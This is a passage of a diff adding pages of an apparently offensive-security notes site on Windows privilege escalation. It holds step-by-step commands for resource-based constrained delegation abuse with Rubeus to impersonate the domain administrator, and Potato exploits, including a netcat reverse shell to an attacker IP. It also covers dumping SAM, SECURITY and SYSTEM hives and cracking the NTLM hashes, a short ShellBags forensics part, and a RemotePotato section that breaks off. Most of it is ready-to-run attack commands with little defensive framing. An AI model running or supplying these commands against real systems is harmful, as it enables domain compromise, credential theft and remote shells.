+</span><span id="__span-101-2"><a id="__codelineno-101-2" name="__codelineno-101-2" href="#__codelineno-101-2"></a>
+</span><span id="__span-101-3"><a id="__codelineno-101-3" name="__codelineno-101-3" href="#__codelineno-101-3"></a>Check if users are allowed to create a new computer object on the domain.
+</span></code></pre></div>
+Get-DomainObject -Identity "dc=example,dc=com" -Domain example.com</p>
+<h1 id="-">-------------------------</h1>
+<h1 id="result">Result</h1>
+<p>ms-ds-machineaccountquota: 10
+<div class="language-text highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a>And check if the machine is at least Windows Server 2012.
+</span></code></pre></div>
+Get-DomainController</p>
+<h1 id="-_1">-------------------------</h1>
+<h1 id="result_1">Result</h1>
+<p>OSVersion: Windows Server 2022 Standard
+<div class="language-text highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a>Additionally, check if the target computer does not have the attributes **“msds-allowedtoactionbehalfofotheridentity”** set.
+</span></code></pre></div>
+hostname
+Get-NetComputer <hostname> | Select-Object -Property name, msds-allowedtoactionbehalfofotheridentity</p>
+<h1 id="-_2">------------------</h1>
+<h1 id="result_2">Result</h1>
+<p>name msds-allowedtoactionbehalfofotheridentity</p>
+<hr />
+<p><HOSTNAME>   {1, 0, 4, 128...}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a>### 2. Create a New Computer
+</span><span id="__span-104-2"><a id="__codelineno-104-2" name="__codelineno-104-2" href="#__codelineno-104-2"></a>
+</span><span id="__span-104-3"><a id="__codelineno-104-3" name="__codelineno-104-3" href="#__codelineno-104-3"></a>Now you can create a new computer object.
+</span></code></pre></div>
+New-MachineAccount -MachineAccount TEST01 -Password $(ConvertTo-SecureString '12345' -AsPlainText -Force)
+Get-DomainComputer test01</p>
+<h1 id="-_3">----------------------</h1>
+<h1 id="result-copy-the-id">Result (copy the id)</h1>
+<p>objectsid: S-1-5-21-1677581083-3380853377-188903654-5103
+<div class="language-text highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a>Create a new raw security descriptor.
+</span></code></pre></div></p>
+<h1 id="paste-the-objectsid-which-was-copied-in-previous-section">Paste the objectsid which was copied in previous section.</h1>
+<p>$objectsid = "S-1-5-21-1677581083-3380853377-188903654-5103"</p>
+<p>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$objectsid)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)</p>
+<p>Get-DomainComputer $(hostname) | Set-DomainObject -Set @{'msds-allowedtoactionbehalfofotheridentity'=$SDBytes} -Verbose
+<div class="language-text highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a>### 3. Impersonate to Get a Ticket
+</span><span id="__span-106-2"><a id="__codelineno-106-2" name="__codelineno-106-2" href="#__codelineno-106-2"></a>
+</span><span id="__span-106-3"><a id="__codelineno-106-3" name="__codelineno-106-3" href="#__codelineno-106-3"></a>Download Rubeus.exe in local machine.
+</span></code></pre></div>
+wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
+<div class="language-text highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a>Then upload it to the target machine and generate a RC4 hash.
+</span></code></pre></div></p>
+<h1 id="evil-winrm_1">Evil-WinRM</h1>
+<p>upload Rubeus.exe
+.\Rubeus.exe hash /password:12345 /user:test01 /domain:example.com</p>
+<h1 id="-_4">-------------------------</h1>
+<h1 id="result-copy-the-rc4-hash">Result (copy the rc4 hash)</h1>
+<p>rc4_hmac: 32ED87BDB5FDC5E9CBA88547376818D4</p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a>We can request a Kerberos ticket for a new machine account while impersonating an administrator.
+</span></code></pre></div>
+.\Rubeus.exe s4u /user:test01$ /rc4:<rc4-hash> /impersonateuser:administrator /msdsspn:cifs/<hostname>.example.com /ptt</p>
+<h1 id="-_5">--------------</h1>
+<h1 id="result-copy-the-output-long-hash-at-the-last">Result (copy the output long hash at the last)</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a>Then generate a ticket (**`.kirbi`**).
+</span></code></pre></div>
+<p>download ticket.kirbi
+<div class="language-text highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a>### 4. Make the Ticket Usable and Use It
+</span><span id="__span-110-2"><a id="__codelineno-110-2" name="__codelineno-110-2" href="#__codelineno-110-2"></a>
+</span><span id="__span-110-3"><a id="__codelineno-110-3" name="__codelineno-110-3" href="#__codelineno-110-3"></a>Download “ticket_converter.py”.
+</span></code></pre></div>
+wget https://raw.githubusercontent.com/zer1t0/ticket_converter/master/ticket_converter.py
+<div class="language-text highlight"><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a>Destroy any tickets in local machine, and convert the ticket to Linux usable, then set the new ticket’s path.
+</span></code></pre></div>
+kdestroy
+python3 ticket_converter.py ticket.kirbi ticket.ccache
+export KRB5CCNAME=ticket.ccache
+<div class="language-text highlight"><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a>We can use the ticket to get a shell.
+</span></code></pre></div>
+impacket-wmiexec example.com/administrator@<hostname>.example.com -no-pass -k
+<div class="language-text highlight"><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a># Windows PrivEsc with LocalPotato
+</span><span id="__span-113-2"><a id="__codelineno-113-2" name="__codelineno-113-2" href="#__codelineno-113-2"></a>
+</span><span id="__span-113-3"><a id="__codelineno-113-3" name="__codelineno-113-3" href="#__codelineno-113-3"></a>    - [Potatoes_Windows_Privesc](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
+</span><span id="__span-113-4"><a id="__codelineno-113-4" name="__codelineno-113-4" href="#__codelineno-113-4"></a>    - [decoder-it](https://github.com/decoder-it/LocalPotato)
+</span><span id="__span-113-5"><a id="__codelineno-113-5" name="__codelineno-113-5" href="#__codelineno-113-5"></a>    - [localpotato](https://www.localpotato.com/localpotato_html/LocalPotato.html)
+</span><span id="__span-113-6"><a id="__codelineno-113-6" name="__codelineno-113-6" href="#__codelineno-113-6"></a>    - [tryhackme.com](https://tryhackme.com/room/localpotato)
+</span><span id="__span-113-7"><a id="__codelineno-113-7" name="__codelineno-113-7" href="#__codelineno-113-7"></a>    - [roguepotato-and-printspoofer](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer)
+</span><span id="__span-113-8"><a id="__codelineno-113-8" name="__codelineno-113-8" href="#__codelineno-113-8"></a>    - [foxglovesecurity.com](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
+</span><span id="__span-113-9"><a id="__codelineno-113-9" name="__codelineno-113-9" href="#__codelineno-113-9"></a>
+</span><span id="__span-113-10"><a id="__codelineno-113-10" name="__codelineno-113-10" href="#__codelineno-113-10"></a>
+</span><span id="__span-113-11"><a id="__codelineno-113-11" name="__codelineno-113-11" href="#__codelineno-113-11"></a>## EfsPotato
+</span><span id="__span-113-12"><a id="__codelineno-113-12" name="__codelineno-113-12" href="#__codelineno-113-12"></a>### Required Privilege
+</span><span id="__span-113-13"><a id="__codelineno-113-13" name="__codelineno-113-13" href="#__codelineno-113-13"></a>
+</span><span id="__span-113-14"><a id="__codelineno-113-14" name="__codelineno-113-14" href="#__codelineno-113-14"></a>- `SeImpersonatePrivilege`
+</span><span id="__span-113-15"><a id="__codelineno-113-15" name="__codelineno-113-15" href="#__codelineno-113-15"></a>
+</span><span id="__span-113-16"><a id="__codelineno-113-16" name="__codelineno-113-16" href="#__codelineno-113-16"></a>### Payloads
+</span><span id="__span-113-17"><a id="__codelineno-113-17" name="__codelineno-113-17" href="#__codelineno-113-17"></a>
+</span><span id="__span-113-18"><a id="__codelineno-113-18" name="__codelineno-113-18" href="#__codelineno-113-18"></a>- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
+</span></code></pre></div>
+EfsPotato "cmd.exe /c whoami"
+<div class="language-text highlight"><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a>&lt;br /&gt;
+</span><span id="__span-114-2"><a id="__codelineno-114-2" name="__codelineno-114-2" href="#__codelineno-114-2"></a>
+</span><span id="__span-114-3"><a id="__codelineno-114-3" name="__codelineno-114-3" href="#__codelineno-114-3"></a>## GodPotato
+</span><span id="__span-114-4"><a id="__codelineno-114-4" name="__codelineno-114-4" href="#__codelineno-114-4"></a>### Required Privileges
+</span><span id="__span-114-5"><a id="__codelineno-114-5" name="__codelineno-114-5" href="#__codelineno-114-5"></a>
+</span><span id="__span-114-6"><a id="__codelineno-114-6" name="__codelineno-114-6" href="#__codelineno-114-6"></a>- `SeImpersonatePrivilege`
+</span><span id="__span-114-7"><a id="__codelineno-114-7" name="__codelineno-114-7" href="#__codelineno-114-7"></a>
+</span><span id="__span-114-8"><a id="__codelineno-114-8" name="__codelineno-114-8" href="#__codelineno-114-8"></a>### Payloads
+</span><span id="__span-114-9"><a id="__codelineno-114-9" name="__codelineno-114-9" href="#__codelineno-114-9"></a>
+</span><span id="__span-114-10"><a id="__codelineno-114-10" name="__codelineno-114-10" href="#__codelineno-114-10"></a>- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
+</span></code></pre></div>
+GodPotato -cmd "cmd /c whoami"
+<div class="language-text highlight"><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1" href="#__codelineno-115-1"></a>&lt;br /&gt;
+</span><span id="__span-115-2"><a id="__codelineno-115-2" name="__codelineno-115-2" href="#__codelineno-115-2"></a>
+</span><span id="__span-115-3"><a id="__codelineno-115-3" name="__codelineno-115-3" href="#__codelineno-115-3"></a>## JuicyPotato
+</span><span id="__span-115-4"><a id="__codelineno-115-4" name="__codelineno-115-4" href="#__codelineno-115-4"></a>### Required Privilege
+</span><span id="__span-115-5"><a id="__codelineno-115-5" name="__codelineno-115-5" href="#__codelineno-115-5"></a>
+</span><span id="__span-115-6"><a id="__codelineno-115-6" name="__codelineno-115-6" href="#__codelineno-115-6"></a>- `SeImpersonatePrivilege` or `SeAssignPrimaryToken`
+</span><span id="__span-115-7"><a id="__codelineno-115-7" name="__codelineno-115-7" href="#__codelineno-115-7"></a>
+</span><span id="__span-115-8"><a id="__codelineno-115-8" name="__codelineno-115-8" href="#__codelineno-115-8"></a>### Payloads
+</span><span id="__span-115-9"><a id="__codelineno-115-9" name="__codelineno-115-9" href="#__codelineno-115-9"></a>
+</span><span id="__span-115-10"><a id="__codelineno-115-10" name="__codelineno-115-10" href="#__codelineno-115-10"></a>- [https://github.com/antonioCoco/JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)
+</span><span id="__span-115-11"><a id="__codelineno-115-11" name="__codelineno-115-11" href="#__codelineno-115-11"></a>- [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)
+</span><span id="__span-115-12"><a id="__codelineno-115-12" name="__codelineno-115-12" href="#__codelineno-115-12"></a>
+</span><span id="__span-115-13"><a id="__codelineno-115-13" name="__codelineno-115-13" href="#__codelineno-115-13"></a>Before exploiting, we need to upload **`nc.exe`** (it is available from [here](https://github.com/int0x33/nc.exe/)) to the target machine.
+</span></code></pre></div>
+Invoke-WebRequest -Uri http://10.0.0.1:8000/nc.exe -OutFile c:\Temp\nc.exe
+<div class="language-text highlight"><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1" href="#__codelineno-116-1"></a>Next start a listener in local machine.
+</span></code></pre></div>
+nc -lvnp 4444
+<div class="language-text highlight"><pre><span></span><code><span id="__span-117-1"><a id="__codelineno-117-1" name="__codelineno-117-1" href="#__codelineno-117-1"></a>Then execute **`JuicyPotato`** in target machine.
+</span></code></pre></div>
+JuicyPotatoNG.exe -t * -p "c:\Temp\nc.exe" -a "10.0.0.1 4444 -e cmd.exe"
+<div class="language-text highlight"><pre><span></span><code><span id="__span-118-1"><a id="__codelineno-118-1" name="__codelineno-118-1" href="#__codelineno-118-1"></a>&lt;br /&gt;
+</span><span id="__span-118-2"><a id="__codelineno-118-2" name="__codelineno-118-2" href="#__codelineno-118-2"></a>
+</span><span id="__span-118-3"><a id="__codelineno-118-3" name="__codelineno-118-3" href="#__codelineno-118-3"></a>## PrintSpoofer
+</span><span id="__span-118-4"><a id="__codelineno-118-4" name="__codelineno-118-4" href="#__codelineno-118-4"></a>### Required Privilege
+</span><span id="__span-118-5"><a id="__codelineno-118-5" name="__codelineno-118-5" href="#__codelineno-118-5"></a>
+</span><span id="__span-118-6"><a id="__codelineno-118-6" name="__codelineno-118-6" href="#__codelineno-118-6"></a>- `SeImpersonatePrivilege`
+</span><span id="__span-118-7"><a id="__codelineno-118-7" name="__codelineno-118-7" href="#__codelineno-118-7"></a>
+</span><span id="__span-118-8"><a id="__codelineno-118-8" name="__codelineno-118-8" href="#__codelineno-118-8"></a>### Payloads
+</span><span id="__span-118-9"><a id="__codelineno-118-9" name="__codelineno-118-9" href="#__codelineno-118-9"></a>
+</span><span id="__span-118-10"><a id="__codelineno-118-10" name="__codelineno-118-10" href="#__codelineno-118-10"></a>- [https://github.com/dievus/printspoofer](https://github.com/dievus/printspoofer)
+</span></code></pre></div>
+PrintSpoofer.exe -i -c cmd
+<div class="language-text highlight"><pre><span></span><code><span id="__span-119-1"><a id="__codelineno-119-1" name="__codelineno-119-1" href="#__codelineno-119-1"></a>&lt;br /&gt;
+</span><span id="__span-119-2"><a id="__codelineno-119-2" name="__codelineno-119-2" href="#__codelineno-119-2"></a>
+</span><span id="__span-119-3"><a id="__codelineno-119-3" name="__codelineno-119-3" href="#__codelineno-119-3"></a>## RoguePotato
+</span><span id="__span-119-4"><a id="__codelineno-119-4" name="__codelineno-119-4" href="#__codelineno-119-4"></a>### Required Privilege
+</span><span id="__span-119-5"><a id="__codelineno-119-5" name="__codelineno-119-5" href="#__codelineno-119-5"></a>
+</span><span id="__span-119-6"><a id="__codelineno-119-6" name="__codelineno-119-6" href="#__codelineno-119-6"></a>- `SeImpersonatePrivilege`
+</span><span id="__span-119-7"><a id="__codelineno-119-7" name="__codelineno-119-7" href="#__codelineno-119-7"></a>
+</span><span id="__span-119-8"><a id="__codelineno-119-8" name="__codelineno-119-8" href="#__codelineno-119-8"></a>### Payloads
+</span><span id="__span-119-9"><a id="__codelineno-119-9" name="__codelineno-119-9" href="#__codelineno-119-9"></a>
+</span><span id="__span-119-10"><a id="__codelineno-119-10" name="__codelineno-119-10" href="#__codelineno-119-10"></a>- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
+</span><span id="__span-119-11"><a id="__codelineno-119-11" name="__codelineno-119-11" href="#__codelineno-119-11"></a>
+</span><span id="__span-119-12"><a id="__codelineno-119-12" name="__codelineno-119-12" href="#__codelineno-119-12"></a>&lt;br /&gt;
+</span><span id="__span-119-13"><a id="__codelineno-119-13" name="__codelineno-119-13" href="#__codelineno-119-13"></a>
+</span><span id="__span-119-14"><a id="__codelineno-119-14" name="__codelineno-119-14" href="#__codelineno-119-14"></a>## RottenPotato
+</span><span id="__span-119-15"><a id="__codelineno-119-15" name="__codelineno-119-15" href="#__codelineno-119-15"></a>### Required Privilege
+</span><span id="__span-119-16"><a id="__codelineno-119-16" name="__codelineno-119-16" href="#__codelineno-119-16"></a>
+</span><span id="__span-119-17"><a id="__codelineno-119-17" name="__codelineno-119-17" href="#__codelineno-119-17"></a>- `SeImpersonatePrivilege`
+</span><span id="__span-119-18"><a id="__codelineno-119-18" name="__codelineno-119-18" href="#__codelineno-119-18"></a>
+</span><span id="__span-119-19"><a id="__codelineno-119-19" name="__codelineno-119-19" href="#__codelineno-119-19"></a>### Payloads
+</span><span id="__span-119-20"><a id="__codelineno-119-20" name="__codelineno-119-20" href="#__codelineno-119-20"></a>
+</span><span id="__span-119-21"><a id="__codelineno-119-21" name="__codelineno-119-21" href="#__codelineno-119-21"></a>- [https://github.com/breenmachine/RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)
+</span><span id="__span-119-22"><a id="__codelineno-119-22" name="__codelineno-119-22" href="#__codelineno-119-22"></a>
+</span><span id="__span-119-23"><a id="__codelineno-119-23" name="__codelineno-119-23" href="#__codelineno-119-23"></a>
+</span><span id="__span-119-24"><a id="__codelineno-119-24" name="__codelineno-119-24" href="#__codelineno-119-24"></a>
+</span><span id="__span-119-25"><a id="__codelineno-119-25" name="__codelineno-119-25" href="#__codelineno-119-25"></a># Windows PrivEsc with Registry Keys
+</span><span id="__span-119-26"><a id="__codelineno-119-26" name="__codelineno-119-26" href="#__codelineno-119-26"></a>
+</span><span id="__span-119-27"><a id="__codelineno-119-27" name="__codelineno-119-27" href="#__codelineno-119-27"></a>The Windows Registry is a hierarchical database that stores low-level settings for Windows and for applications that opt to use the registry. Registry keys are container objects, which contain values and subkeys. These similar to folders.
+</span><span id="__span-119-28"><a id="__codelineno-119-28" name="__codelineno-119-28" href="#__codelineno-119-28"></a>
+</span><span id="__span-119-29"><a id="__codelineno-119-29" name="__codelineno-119-29" href="#__codelineno-119-29"></a>
+</span><span id="__span-119-30"><a id="__codelineno-119-30" name="__codelineno-119-30" href="#__codelineno-119-30"></a>## Investigation
+</span><span id="__span-119-31"><a id="__codelineno-119-31" name="__codelineno-119-31" href="#__codelineno-119-31"></a>
+</span><span id="__span-119-32"><a id="__codelineno-119-32" name="__codelineno-119-32" href="#__codelineno-119-32"></a>Find interesting registry or values in registry keys.
+</span></code></pre></div></p>
+<h1 id="hklm-hkey_local_machine">HKLM: HKEY_LOCAL_MACHINE</h1>
+<p>reg query HKLM
+reg query HKLM\SAM
+reg query HKLM\SAM\SAM
+reg query HKLM\SECURITY
+reg query HKLM\SOFTWARE
+reg query HKLM\SYSTEM</p>
+<h1 id="find-user-credentials">Find user credentials</h1>
+<p>reg query “HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon”</p>
+<h1 id="hku-hkey_users">HKU: HKEY_USERS</h1>
+<p>reg query HKU
+reg query HKU\S-1-2-3</p>
+<h1 id="hkcu-hkey_current_user">HKCU: HKEY_CURRENT_USER</h1>
+<p>reg query HKCU
+reg query HKCU\System
+<div class="language-text highlight"><pre><span></span><code><span id="__span-120-1"><a id="__codelineno-120-1" name="__codelineno-120-1" href="#__codelineno-120-1"></a>&lt;br /&gt;
+</span><span id="__span-120-2"><a id="__codelineno-120-2" name="__codelineno-120-2" href="#__codelineno-120-2"></a>
+</span><span id="__span-120-3"><a id="__codelineno-120-3" name="__codelineno-120-3" href="#__codelineno-120-3"></a>## Reveal Password from Registry Hives
+</span><span id="__span-120-4"><a id="__codelineno-120-4" name="__codelineno-120-4" href="#__codelineno-120-4"></a>
+</span><span id="__span-120-5"><a id="__codelineno-120-5" name="__codelineno-120-5" href="#__codelineno-120-5"></a>A hive is a logical group of keys, subkeys, and values in the registry that has a set of supporting files loaded into memory when the operating system is started or a user logs in.
+</span><span id="__span-120-6"><a id="__codelineno-120-6" name="__codelineno-120-6" href="#__codelineno-120-6"></a>
+</span><span id="__span-120-7"><a id="__codelineno-120-7" name="__codelineno-120-7" href="#__codelineno-120-7"></a>If we can access to registries and get registry hives, the password hashes can be dumped.  
+</span><span id="__span-120-8"><a id="__codelineno-120-8" name="__codelineno-120-8" href="#__codelineno-120-8"></a>Copy three hives (**SAM, SECURITY, SYSTEM**) to arbitrary direcotyr where we can access.
+</span></code></pre></div></p>
+<h1 id="save-saves-a-copy-of-specified-subkeys-entries-and-values-of-the-registry-in-a-specified-file">save: Saves a copy of specified subkeys, entries, and values of the registry in a specified file.</h1>
+<h1 id="hklm-hkey_local_machine_1">HKLM: HKEY_LOCAL_MACHINE</h1>
+<p>reg save HKLM\sam c:\Users\<user>\Desktop\sam.save
+reg save HKLM\security c:\Users\<user>\Desktop\security.save
+reg save HKLM\system c:\Users\<user>\Desktop\system.save
+<div class="language-text highlight"><pre><span></span><code><span id="__span-121-1"><a id="__codelineno-121-1" name="__codelineno-121-1" href="#__codelineno-121-1"></a>After that, we can dump password hashes from hives.
+</span></code></pre></div>
+impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
+<div class="language-text highlight"><pre><span></span><code><span id="__span-122-1"><a id="__codelineno-122-1" name="__codelineno-122-1" href="#__codelineno-122-1"></a>### Crack Hashes
+</span><span id="__span-122-2"><a id="__codelineno-122-2" name="__codelineno-122-2" href="#__codelineno-122-2"></a>
+</span><span id="__span-122-3"><a id="__codelineno-122-3" name="__codelineno-122-3" href="#__codelineno-122-3"></a>After dumping hashes, we can crack them.  
+</span><span id="__span-122-4"><a id="__codelineno-122-4" name="__codelineno-122-4" href="#__codelineno-122-4"></a>First, we extract NTLM from the hash. For example, the dumped hash is below.
+</span></code></pre></div>
+Administrator:500:abcdefghi...:zyxwvuts...:::
+<div class="language-text highlight"><pre><span></span><code><span id="__span-123-1"><a id="__codelineno-123-1" name="__codelineno-123-1" href="#__codelineno-123-1"></a>We need only the right string &quot;zyxwvuts…&quot;, so extract it to a text file as below.
+</span></code></pre></div>
+echo -n "zyxwvuts..." &gt; hash.txt
+<div class="language-text highlight"><pre><span></span><code><span id="__span-124-1"><a id="__codelineno-124-1" name="__codelineno-124-1" href="#__codelineno-124-1"></a>Now crack it using **Hashcat** or **John The Ripper**.  
+</span><span id="__span-124-2"><a id="__codelineno-124-2" name="__codelineno-124-2" href="#__codelineno-124-2"></a>See more details **[here](/exploit/windows/dumping-windows-password-hashes/)**.
+</span></code></pre></div></p>
+<h1 id="hashcat">Hashcat</h1>
+<h1 id="-m-1000-mode-ntlm">-m 1000: mode NTLM</h1>
+<p>hashcat -m 1000 hash.txt wordlist.txt</p>
+<h1 id="john-the-ripper">John The Ripper</h1>
+<p>john --format=nt --wordlist=wordlist.txt hash.txt
+<div class="language-text highlight"><pre><span></span><code><span id="__span-125-1"><a id="__codelineno-125-1" name="__codelineno-125-1" href="#__codelineno-125-1"></a>If we get the password, we can use it for abusing the target machine.  
+</span><span id="__span-125-2"><a id="__codelineno-125-2" name="__codelineno-125-2" href="#__codelineno-125-2"></a>For example, we can use it to **WinRM** as below.
+</span></code></pre></div>
+evil-winrm -i <victim_ip> -u <victim_username> -p <victim_password>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-126-1"><a id="__codelineno-126-1" name="__codelineno-126-1" href="#__codelineno-126-1"></a>&lt;br /&gt;
+</span><span id="__span-126-2"><a id="__codelineno-126-2" name="__codelineno-126-2" href="#__codelineno-126-2"></a>
+</span><span id="__span-126-3"><a id="__codelineno-126-3" name="__codelineno-126-3" href="#__codelineno-126-3"></a>## ShellBags
+</span><span id="__span-126-4"><a id="__codelineno-126-4" name="__codelineno-126-4" href="#__codelineno-126-4"></a>
+</span><span id="__span-126-5"><a id="__codelineno-126-5" name="__codelineno-126-5" href="#__codelineno-126-5"></a>A set of registry keys that store details about a viewed folder, such as its size, position, and icon.
+</span><span id="__span-126-6"><a id="__codelineno-126-6" name="__codelineno-126-6" href="#__codelineno-126-6"></a>
+</span><span id="__span-126-7"><a id="__codelineno-126-7" name="__codelineno-126-7" href="#__codelineno-126-7"></a>### Location
+</span></code></pre></div>
+c:\Users\<username>\AppData\Local\Microsoft\Windows\UsrClass.dat
+<div class="language-text highlight"><pre><span></span><code><span id="__span-127-1"><a id="__codelineno-127-1" name="__codelineno-127-1" href="#__codelineno-127-1"></a>If we cannot found AppData folder in Explorer, click &quot;View&quot; tab and check &quot;Hidden Items&quot;.
+</span><span id="__span-127-2"><a id="__codelineno-127-2" name="__codelineno-127-2" href="#__codelineno-127-2"></a>
+</span><span id="__span-127-3"><a id="__codelineno-127-3" name="__codelineno-127-3" href="#__codelineno-127-3"></a>### Access to Shellbag**
+</span><span id="__span-127-4"><a id="__codelineno-127-4" name="__codelineno-127-4" href="#__codelineno-127-4"></a>
+</span><span id="__span-127-5"><a id="__codelineno-127-5" name="__codelineno-127-5" href="#__codelineno-127-5"></a>1. Search &quot;regedit&quot; on search bar and open &quot;Registry Editor&quot;
+</span><span id="__span-127-6"><a id="__codelineno-127-6" name="__codelineno-127-6" href="#__codelineno-127-6"></a>
+</span><span id="__span-127-7"><a id="__codelineno-127-7" name="__codelineno-127-7" href="#__codelineno-127-7"></a>2. Go to &quot;Computer\HKEY_CLASSES_ROOT\LocalSettings\Software\Microsoft\Windows\Shell\Bags&quot;
+</span><span id="__span-127-8"><a id="__codelineno-127-8" name="__codelineno-127-8" href="#__codelineno-127-8"></a>
+</span><span id="__span-127-9"><a id="__codelineno-127-9" name="__codelineno-127-9" href="#__codelineno-127-9"></a>### ShellBags Explorer
+</span><span id="__span-127-10"><a id="__codelineno-127-10" name="__codelineno-127-10" href="#__codelineno-127-10"></a>
+</span><span id="__span-127-11"><a id="__codelineno-127-11" name="__codelineno-127-11" href="#__codelineno-127-11"></a>Extract ShellBags information.
+</span><span id="__span-127-12"><a id="__codelineno-127-12" name="__codelineno-127-12" href="#__codelineno-127-12"></a>
+</span><span id="__span-127-13"><a id="__codelineno-127-13" name="__codelineno-127-13" href="#__codelineno-127-13"></a>1. Open &quot;ShellBags Explorer&quot;
+</span><span id="__span-127-14"><a id="__codelineno-127-14" name="__codelineno-127-14" href="#__codelineno-127-14"></a>
+</span><span id="__span-127-15"><a id="__codelineno-127-15" name="__codelineno-127-15" href="#__codelineno-127-15"></a>2. Select &quot;File&quot; -&gt; &quot;Load offline hive&quot;
+</span><span id="__span-127-16"><a id="__codelineno-127-16" name="__codelineno-127-16" href="#__codelineno-127-16"></a>
+</span><span id="__span-127-17"><a id="__codelineno-127-17" name="__codelineno-127-17" href="#__codelineno-127-17"></a>3. Navigate to the UsrClass.dat and open the file
+</span><span id="__span-127-18"><a id="__codelineno-127-18" name="__codelineno-127-18" href="#__codelineno-127-18"></a>
+</span><span id="__span-127-19"><a id="__codelineno-127-19" name="__codelineno-127-19" href="#__codelineno-127-19"></a>4. Find suspicious folder and file
+</span><span id="__span-127-20"><a id="__codelineno-127-20" name="__codelineno-127-20" href="#__codelineno-127-20"></a>
+</span><span id="__span-127-21"><a id="__codelineno-127-21" name="__codelineno-127-21" href="#__codelineno-127-21"></a>
+</span><span id="__span-127-22"><a id="__codelineno-127-22" name="__codelineno-127-22" href="#__codelineno-127-22"></a>
+</span><span id="__span-127-23"><a id="__codelineno-127-23" name="__codelineno-127-23" href="#__codelineno-127-23"></a># Windows PrivEsc with RemotePotato
+</span><span id="__span-127-24"><a id="__codelineno-127-24" name="__codelineno-127-24" href="#__codelineno-127-24"></a>
+</span><span id="__span-127-25"><a id="__codelineno-127-25" name="__codelineno-127-25" href="#__codelineno-127-25"></a>
+</span><span id="__span-127-26"><a id="__codelineno-127-26" name="__codelineno-127-26" href="#__codelineno-127-26"></a>    - [RemotePotato0](https://github.com/antonioCoco/RemotePotato0)
+</span><span id="__span-127-27"><a id="__codelineno-127-27" name="__codelineno-127-27" href="#__codelineno-127-27"></a>
+</span><span id="__span-127-28"><a id="__codelineno-127-28" name="__codelineno-127-28" href="#__codelineno-127-28"></a>
+</span><span id="__span-127-29"><a id="__codelineno-127-29" name="__codelineno-127-29" href="#__codelineno-127-29"></a>## Exploit
+</span><span id="__span-127-30"><a id="__codelineno-127-30" name="__codelineno-127-30" href="#__codelineno-127-30"></a>
+</span><span id="__span-127-31"><a id="__codelineno-127-31" name="__codelineno-127-31" href="#__codelineno-127-31"></a>Reference: [RemotePotato0](https://github.com/antonioCoco/RemotePotato0)
+</span><span id="__span-127-32"><a id="__codelineno-127-32" name="__codelineno-127-32" href="#__codelineno-127-32"></a>
+</span><span id="__span-127-33"><a id="__codelineno-127-33" name="__codelineno-127-33" href="#__codelineno-127-33"></a>According to the RemotePotato0&#39;s README, it abuses the DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user).  
+</span><span id="__span-127-34"><a id="__codelineno-127-34" name="__codelineno-127-34" href="#__codelineno-127-34"></a>
+</span><span id="__span-127-35"><a id="__codelineno-127-35" name="__codelineno-127-35" href="#__codelineno-127-35"></a>We can download the executable from [https://github.com/antonioCoco/RemotePotato0](https://github.com/antonioCoco/RemotePotato0).  
+</span><span id="__span-127-36"><a id="__codelineno-127-36" name="__codelineno-127-36" href="#__codelineno-127-36"></a>
+</span><span id="__span-127-37"><a id="__codelineno-127-37" name="__codelineno-127-37" href="#__codelineno-127-37"></a>
+</span><span id="__span-127-38"><a id="__codelineno-127-38" name="__codelineno-127-38" href="#__codelineno-127-38"></a>### Module 0 (`-m 0`: Rpc2Http cross protocol relay server + potato trigger)
+</span></code></pre></div></p>
+<h1 id="in-attack-machine">In attack machine</h1>
+<p>sudo socat tcp-listen:135,fork,reuseaddr tcp:<target-ip>:9999 &amp;
